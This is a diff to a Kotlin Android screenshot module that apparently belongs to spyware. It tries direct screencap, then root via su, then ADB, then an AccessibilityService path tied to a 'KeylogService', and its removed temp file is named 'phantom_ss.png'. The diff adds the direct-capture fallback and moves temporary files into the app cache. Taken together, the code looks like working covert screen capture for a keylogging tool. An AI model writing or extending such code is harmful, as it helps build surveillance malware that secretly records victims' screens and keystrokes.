@@ -26,23 +26,34 @@ class ScreenshotModule(private val context: android.content.Context) {
     fun capture(callback: Callback) {
         Log.d(TAG, "start")
 
-        // 1. Root
+        val tmpDir = context.cacheDir.resolve("ss").also { it.mkdirs() }
+        val tmpFile = File(tmpDir, "screen_${System.currentTimeMillis()}.png")
+
+        // 1. Direct screencap (works on emulator without root)
+        Log.d(TAG, "trying direct screencap")
+        val directResult = captureDirect(tmpFile)
+        if (directResult != null) {
+            val processed = processBytes(directResult)
+            if (processed != null) { callback.onSuccess(processed); return }
+        }
+
+        // 2. Root (emulator with su)
         Log.d(TAG, "trying root")
-        val rootResult = captureRoot()
+        val rootResult = captureRoot(tmpFile)
         if (rootResult != null) {
             val processed = processBytes(rootResult)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 2. ADB (emulator)
+        // 3. ADB (emulator)
         Log.d(TAG, "trying adb")
-        val adbResult = captureADB()
+        val adbResult = captureADB(tmpFile)
         if (adbResult != null) {
             val processed = processBytes(adbResult)
             if (processed != null) { callback.onSuccess(processed); return }
         }
 
-        // 3. AccessibilityService (Android 14+)
+        // 4. AccessibilityService (Android 14+)
         if (Build.VERSION.SDK_INT >= 34 && KeylogService.isRunning) {
             Log.d(TAG, "trying accessibility")
             captureAccessibility(callback)
@@ -53,18 +64,33 @@ class ScreenshotModule(private val context: android.content.Context) {
         callback.onFailure("No screenshot method available. Need: Root, ADB, or AccessibilityService")
     }
 
-    private fun captureRoot(): ByteArray? {
+    private fun captureDirect(tmpFile: File): ByteArray? {
         return try {
-            val tmp = "/data/local/tmp/phantom_ss.png"
-            val proc = ProcessBuilder("su", "-c", "screencap -p '$tmp'")
+            val proc = ProcessBuilder("sh", "-c", "screencap -p '${tmpFile.absolutePath}'")
                 .redirectErrorStream(true).start()
             val ok = proc.waitFor(10, TimeUnit.SECONDS)
             if (!ok) { proc.destroyForcibly(); return null }
             if (proc.exitValue() != 0) return null
-            val f = File(tmp)
-            if (!f.exists() || f.length() == 0L) return null
-            val bytes = f.readBytes()
-            f.delete()
+            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
+            val bytes = tmpFile.readBytes()
+            tmpFile.delete()
+            bytes
+        } catch (e: Exception) {
+            Log.e(TAG, "Direct failed: ${e.message}")
+            null
+        }
+    }
+
+    private fun captureRoot(tmpFile: File): ByteArray? {
+        return try {
+            val proc = ProcessBuilder("su", "-c", "screencap -p '${tmpFile.absolutePath}'")
+                .redirectErrorStream(true).start()
+            val ok = proc.waitFor(10, TimeUnit.SECONDS)
+            if (!ok) { proc.destroyForcibly(); return null }
+            if (proc.exitValue() != 0) return null
+            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
+            val bytes = tmpFile.readBytes()
+            tmpFile.delete()
             bytes
         } catch (e: Exception) {
             Log.e(TAG, "Root failed: ${e.message}")
@@ -72,9 +98,8 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
     }
 
-    private fun captureADB(): ByteArray? {
+    private fun captureADB(tmpFile: File): ByteArray? {
         return try {
-            // Try sdcard first (emulator), fall back to cache dir
             val dirs = listOf(
                 File("/sdcard"),
                 File("/storage/emulated/0"),
